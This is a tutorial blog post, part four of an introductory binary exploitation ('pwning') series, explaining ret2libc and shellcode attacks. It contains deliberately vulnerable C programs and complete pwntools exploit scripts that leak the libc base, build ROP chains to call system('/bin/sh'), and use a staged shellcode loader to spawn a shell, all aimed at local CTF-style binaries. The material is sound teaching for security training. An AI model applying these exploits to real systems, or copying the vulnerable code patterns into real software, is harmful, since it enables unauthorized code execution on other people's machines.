---
title: Introduction to Pwning - Part 4
author: P0ch1ta
date: 2023-05-17 12:33:00 +0530
categories: [Pwning]
tags: [Introduction to Pwning, Ret2libc, Shellcode]
math: true
mermaid: true
---

This is the part four of simple pwning lecture series. The target of this series is to get started with pwning from the very basics to some advanced attack. We will be trying challenges from different CTFs as well to get familiar with the different exploitation vectors. In this lecture we will breifly try to understand how out code works and how can we get started with pwning.


# Ret2libc

In the challenges we have seen before the, there is a `win` function which gives us the shell. Most of the times shuch functions are not present in the binary. In such cases the `ret2libc` attack is useful.

## Introduction

(g)libc, short for GNU C Library, is a critical component of the Linux operating system. It is an implementation of the C standard library and provides essential functions and features that enable programs to interact with the underlying operating system. 

If we normally compile any program (ie. without any flags), it is dynamically compiled. In that case, instead of having the source code of the required library functions like `printf` and `puts` included in binary, they are called dynamically from the libraries present on the system. This has many advantages like the size of the executable is reduced, more efficient use of resources, etc. We can see the memory region in which the `libc` is attached using the `vmmap` command inside `gdb`.

<img src="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/img/Images/Intro_to_pwn_4/1.png" alt="Libraries">

As we can see the `libc` is loaded as `libc.so.6` and the linker for it is loaded as `ld-linux-x86-64.so.2`. The `libc` library has `PIE` enabled and thus if we want to exploit it we would need a libc leak. If we have `libc` leak, then we can call any function from the libc (This statement is only partially correct as sometimes the function might not be callable as it might not have the linking data present). Also, if we have access to `libc` function execution, then we would also have access to the ROP gadgets present in the `libc`.

## Exploitation

Let us try to exploit a sample challenge using ret2libc.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vuln()
{
    printf("Leak : 0x%lx\n",puts);
    char buf1[0x20];
    gets(buf1);
}

int main()
{
    vuln();
    return 0;
}
```

Compile the code using the following commands:

```bash
gcc chal.c -o chal -fno-stack-protector
```

If we use the `ldd` command then we can see which `libc` library are we using for dynamic linking. Let us copy the `libc` that the challenge is compiled with in the current directory for our convinience. In case of CTF challenges the `libc` will be provided and you can use the tool <a href= "https://github.com/NixOS/patchelf">patchelf</a>.

<img src="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/img/Images/Intro_to_pwn_4/2.png" alt="ldd">

Afterwards we will use the prior knowledge of buffer overflow to get control of `rip` register. Using the leak that is provided to us, we can find out the base address of the `libc`. To find the base address, we need to find the offset of `puts` function and then we need to subtract that offset from the leak. This can be implemented as follows.

Let us confirm the base that if the base we have found is corect or not. We can again use the `vmmap` command to confirm the leak.

<img src="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/img/Images/Intro_to_pwn_4/3.png" alt="libc leak">

As we can see we have got the leak, so we can continue with the exploitation. In order to spawn the shell we can call `system(/bin/sh)`. To do this we need to set the `rip` to point to system in `libc`. That would be easy since we have the `libc` base and thus we can now find any function inside of the libc using the offset. Next we need to provide a pointer to the string `/bin/sh` in the `rdi` register. Such pointers are present inside of the `libc` itself. We can find the offset to these pointers using the `grep` command or we can search it inside of `libc` using python. This can be done as follows.

```py
libc = ELF("./libc.so.6",checksec=False)
next(libc.search(b"/bin/sh\x00"))
```
In this case we dont have the `rdi` gadget inside of our binary. Thus we need to use the gadgets of `libc` in order exploit the program. We can dump the rop-gadgets and then add the `libc` base address to get the actual gadget. 

Thus we will get the shell. The exploit to the above challenge is as follows:

```py
from pwn import *

elf = context.binary = ELF("./kek",checksec=False)
p = elf.process()

libc = ELF("./libc.so.6",checksec=False)

gdb.attach(p,'''
    init-gef
''')

p.recvuntil(": ")
x = int(p.recvline()[:-1],16)
print(x)
libc.address = x - libc.sym.puts
log.critical(f"[+] libc base: {hex(libc.address)}")

binsh = next(libc.search(b"/bin/sh\x00"))

rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6

payload = b"a"*40 + p64(rdi) + p64(binsh) + p64(ret) + p64(libc.sym.system)
p.sendline(payload)


p.interactive()
```

Alternately is the leak is not given to us, we can also get a leak by the use of `got` entries. To do that we need to push the `got` entry into `rdi` and then call a function like `puts` to leak the libc. The exploit would look something like this

```py
payload = b"a"*offset + p64(pop_rdi_ret) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(return_to_original_function)
```

Additionally instead of calling `system("/bin/sh")` we can use one-gadgets that can give use RCE. One gadgets are pieces of code inside of `libc` that call `execve("/bin/sh",0,0)`. They can be found out using the <a href="https://github.com/david942j/one_gadget">one gadget</a> tool. The gadgets have certain conditions in which they work and thus not all gadgets might work in exploit. 

**In case if we dont have the `libc` version we could try to find it out by leaking multiple values and using `libc` database to find out the libc version**

## Using syscall

In addition to controling the `rip` value we can also make syscalls. This is possible because `libc` contains the `syscall; ret` gadget which is not found in binary by default. Syscalls are specifically useful in the challenges in which seccomp is enabled. In those cases we need to make syscalls to get the flag.

To dump the syscall gadget we need to use the `--multibr` flag in `ROPgadget`. Make sure you use the `syscall;ret` gadget and not the `syscall` gadget as it might lead to some issues. Also, libc contains various other gadgets which are useful. Using them we can directly control all the registers. To make the `syscall`, we need to load the registers with the required arguments and then call the `syscall` gadget from libc. The details on how to make syscalls can be found in <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">this blog</a>.

# Shellcode

Till this point we have not talked about `NX`. `NX` stands for no execute. It makes that the stack of the program is not executable. So in case `NX` is not present we can put the shellcode on the stack and then we can call the shellcode. In that case we have to write the shellcode in the executable region and then point the `rip` to the region. This also works in case of `mmap`. `mmap` is a `syscall` that is used for memory allocation. If the memory region that is allocated is executable, we can write shellcode there and then execute it by controlling the `rip`. 

*Fun fact: Even malloc internally calls `mmap` in order to allocate memory.*

Here is a sample challenge:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

void vuln()
{
    char *executable_region;
    executable_region = (char *)mmap((void *)0x13370000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    printf("Shellcode here\n");
    fgets(executable_region,10,stdin);
    ((void(*)())executable_region)();
}

int main()
{
    vuln();
    return 0;
}
```

As we can see its very tough to fit out `execve('/bin/sh',0,0)` shellcode in 10 bytes. Thus we will first use the `read` syscall to read our `execve` shellcode and then execute it giving us shell. Thus the `read` shellcode will be as follows:

```nasm
    xor edi, edi
    mov esi, 0x13370009
    syscall
```
The values of `rax` and `rdx` registers were already set to the required amount hence they are not required here. Also I have used 32 bit registers to make the shellcode smaller.

**Note: Try to debug and find out why the value 0x13370009 is moved into `esi`**

Here is the exploit:

```py
from pwn import *

elf = context.binary = ELF("./chall",checksec=False)
p = elf.process()

context.arch = 'amd64'

# gdb.attach(p,'''
#     init-gef
#     b *vuln+101
#     c
#     si
# ''')

shellcode = asm('''
    xor edi, edi
    mov esi, 0x13370009
    syscall
''')

print(len(shellcode))
p.sendline(shellcode)

sleep(1)

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

# Resources

<a href="https://libc.rip/">Libc database</a><br>
<a href="https://github.com/NUSGreyhats/greyctf23-challs-public/tree/main/pwn/arraystore">Ret2libc challenge</a><br>